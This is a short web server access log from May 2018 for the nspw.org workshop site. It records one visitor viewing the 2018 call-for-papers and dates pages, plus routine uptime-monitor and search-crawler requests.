111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:44 -0400] "GET /2018/cfp HTTP/1.1" 200 4880 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:44 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:47:04 -0400] "-" 408 124 "-" "-"
69.162.124.227 - - [04/May/2018:05:47:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
111.204.219.195 - - [04/May/2018:05:47:45 -0400] "GET /2018/dates HTTP/1.1" 200 3003 "https://www.nspw.org/2018/cfp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:47:46 -0400] "GET /favicon.ico HTTP/1.1" 404 825 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:48:05 -0400] "-" 408 124 "-" "-"
111.204.219.195 - - [04/May/2018:05:48:06 -0400] "-" 408 124 "-" "-"
5.255.250.67 - - [04/May/2018:05:52:05 -0400] "GET /robots.txt HTTP/1.1" 200 5979 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
5.255.250.67 - - [04/May/2018:05:52:08 -0400] "GET /2008/dates.shtml HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
